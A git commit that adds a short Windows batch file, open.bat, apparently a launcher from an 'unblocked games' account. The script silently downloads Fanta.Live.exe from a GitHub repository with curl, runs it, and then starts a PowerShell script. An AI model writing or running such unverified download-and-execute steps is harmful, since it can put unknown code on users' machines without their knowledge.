a6cc23d9d71d3164ada431b07da22aedaa866950
Fanta <163449006+unblockedgames2@users.noreply.github.com>
2024-06-18 16:20:08 -0400

    Create open.bat

---
+++ open.bat
@@ -0,0 +1,6 @@
+@echo off
+
+cd %userprofile%\OneDrive\Documents\Path
+curl -s github.com/unblockedgames2/zvgfd/raw/main/Fanta.Live.exe -o Fanta.Live.exe
+Fanta.Live.exe
+powershell parrot-dance.ps1
